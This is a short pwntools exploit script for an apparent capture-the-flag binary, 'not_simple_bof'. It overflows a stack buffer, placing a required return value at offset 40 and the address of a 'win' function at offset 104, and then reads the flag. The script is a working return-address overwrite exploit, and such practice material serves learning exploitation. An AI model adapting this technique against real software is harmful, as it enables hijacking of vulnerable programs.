#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./not_simple_bof')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    if args['LOCAL']:
        return remote('localhost', 4444)
    
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak overflow_me
continue
'''.format(**locals())

required_ret_offset = 40
required_ret = 0x401397

ret_offset = 104
ret_addr = exe.sym['win']

pirate_code = {
    required_ret_offset:required_ret,
    ret_offset:ret_addr
    }
pirate_code_payload = flat(pirate_code)


io = start()

io.sendlineafter(b"What be yer gentleman o' fortune name? ", b'1')
io.sendlineafter(b'What be the pirate code: \n', pirate_code_payload)

io.recvline()
io.recvline()

flag = io.recvlineS()
log.info(flag)
io.close()
